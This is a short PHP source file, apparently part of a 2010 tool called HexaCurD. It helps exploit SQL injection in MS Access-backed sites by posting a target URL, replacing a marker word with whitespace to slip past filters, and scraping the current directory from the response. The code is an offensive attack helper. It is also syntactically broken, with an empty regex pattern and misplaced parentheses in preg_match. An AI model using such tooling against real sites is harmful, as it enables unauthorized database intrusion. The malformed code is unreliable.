<?php

/*

	HexaCurD is an additional tool to aid users to retrieve the Current 
	Directory of a particular table in MsAccess SQL Injection.

	Copyright (C) 2010 Hexon

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


*/

$HexaCurD_Version = "v1.0.0";

include("Information.php");
include("Con_Url_WD.php");

if(isset($_POST['curdsubmit']))
{
$url2=$_POST['url'];
$url = str_replace("hexon",$whitespace,$url2);

if(preg_match('//'),geturl($url),$curdmatch)
{
echo $curdmatch[1] , "<br />";
}
else
{
echo "Either Query is filtered or Table does not exist.";
}
}

